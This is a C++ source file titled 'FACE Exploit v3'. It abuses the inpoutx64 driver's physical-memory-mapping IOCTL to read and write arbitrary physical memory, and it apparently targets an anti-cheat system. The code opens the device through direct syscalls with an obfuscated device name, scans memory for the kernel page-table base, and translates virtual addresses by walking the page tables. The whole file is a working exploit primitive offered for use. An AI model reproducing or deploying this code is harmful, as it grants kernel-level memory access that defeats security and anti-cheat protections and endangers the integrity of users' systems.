//FACE Exploit v3
struct InpOut_IOCTL {
	HANDLE  PhHandle;
	SIZE_T  PhysSize;
	DWORD64 PhysAddr;
	PVOID  VA_MapPtr;
};

class ExpDrv
{
private:
	//get device handle
	HANDLE GetHandle() {
		HANDLE hDrv = nullptr; IO_STATUS_BLOCK IO;
		auto ExpDeviceName = xorstr(L"\\Device\\inpoutx64"); OBJECT_ATTRIBUTES Params;
		UNICODE_STRING Device = UNC_STR(ExpDeviceName.size(), ExpDeviceName.crypt_get());
		InitializeObjectAttributes(&Params, &Device, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
		auto ret = SysCall<NTSTATUS>(51, &hDrv, 0x100003, &Params, &IO, 0, FILE_NON_DIRECTORY_FILE);
		return !ret ? hDrv : nullptr;
	}

	//secure device io ctrl
	void DevIO_Ctrl(uint32_t Code, void* In, uint32_t InSz, void* Out, uint32_t OutSz) {
		auto hDrv = GetHandle(); IO_STATUS_BLOCK IO;
		SysCall(7, hDrv, nullptr, nullptr, nullptr, &IO, Code, In, InSz, Out, OutSz);
		SysCall(15, hDrv);
	}

	//get global dirbase
	uint64_t FindDirBase()
	{
		//scan dir base in region
		uint8_t* Buff = (uint8_t*)malloc1(0x10000);
		for (int i = 0; i < 10; i++)
		{
			//read & check pages
			if (!ReadWritePhys(i * 0x10000, Buff, 0x10000)) continue;
			for (int Offset = 0; Offset < 0x10000; Offset += 0x1000)
			{
				//skip invalid
				if ((0x00000001000600E9 ^ (0xffffffffffff00ff & *(uint64_t*)(Buff + Offset))) ||
					(0xfffff80000000000 ^ (0xfffff80000000000 & *(uint64_t*)(Buff + Offset + 0x70))) ||
					(0xffffff0000000fff & *(uint64_t*)(Buff + Offset + 0xA0)))
					continue;

				//found dir base
				uint64_t DirBase = *(uint64_t*)(Buff + Offset + 0xA0);
				free1(Buff); return DirBase;
			}
		}

		//error
		free1(Buff);
		return 0;
	}

public:
	//phys meme mgr
	PVOID MapPhys(uint64_t Addr, uint32_t Size)
	{
		InpOut_IOCTL Data = { 0, Size, Addr, 0 };
		DevIO_Ctrl(0x9C40201C, &Data, sizeof(Data), &Data, sizeof(Data));
		if (Data.VA_MapPtr) {
			SysCall(15, Data.PhHandle);
			return Data.VA_MapPtr;
		}

		return nullptr;
	}

	bool ReadWritePhys(uint64_t Addr, void* Buff, uint32_t Size, bool Write = false) {
		auto mapVA = MapPhys(Addr, Size);
		if (mapVA) {
			MemCpy(Write ? mapVA : Buff, Write ? Buff : mapVA, Size);
			SysCall(42, (HANDLE)-1, mapVA);
			return true;
		}

		return false;
	}

	uint64_t ToPhysAddr(uint64_t Addr, int* PageSize)
	{
		//get dir base
		static uint64_t DirBase = 0;
		if (!DirBase) {
			DirBase = FindDirBase();
			if (!DirBase)
				return 0;
		}

		//read PML4E
		uint64_t PML4E = 0;
		uint16_t PML4 = (uint16_t)((Addr >> 39) & 0x1FF);
		ReadWritePhys(DirBase + (PML4 * 8), &PML4E, 8);
		if (!PML4E) return 0;

		//read PDPTE 
		uint64_t PDPTE = 0;
		uint16_t DirPtr = (uint16_t)((Addr >> 30) & 0x1FF);
		ReadWritePhys((PML4E & 0xFFFFFFFFFF000) + (DirPtr * 8), &PDPTE, 8);
		if (!PDPTE) return 0;

		//PS=1 (1GB page)
		if ((PDPTE & (1 << 7)) != 0) {
			if (PageSize) *PageSize = 0x40000000/*1Gb*/;
			return (PDPTE & 0xFFFFFC0000000) + (Addr & 0x3FFFFFFF);
		}

		//read PDE 
		uint64_t PDE = 0;
		uint16_t Dir = (uint16_t)((Addr >> 21) & 0x1FF);
		ReadWritePhys((PDPTE & 0xFFFFFFFFFF000) + (Dir * 8), &PDE, 8);
		if (!PDE) return 0;

		//PS=1 (2MB page)
		if ((PDE & (1 << 7)) != 0) {
			if (PageSize) *PageSize = 0x200000/*2MB*/;
			return (PDE & 0xFFFFFFFE00000) + (Addr & 0x1FFFFF);
		}

		//read PTE
		uint64_t PTE = 0;
		uint16_t Table = (uint16_t)((Addr >> 12) & 0x1FF);
		ReadWritePhys((PDE & 0xFFFFFFFFFF000) + (Table * 8), &PTE, 8);
		if (!PTE) return 0;

		//BasePage (4KB Page)
		if (PageSize) *PageSize = 0x1000/*4KB*/;
		return (PTE & 0xFFFFFFFFFF000) + (Addr & 0xFFF);
	}
};

ExpDrv Drv;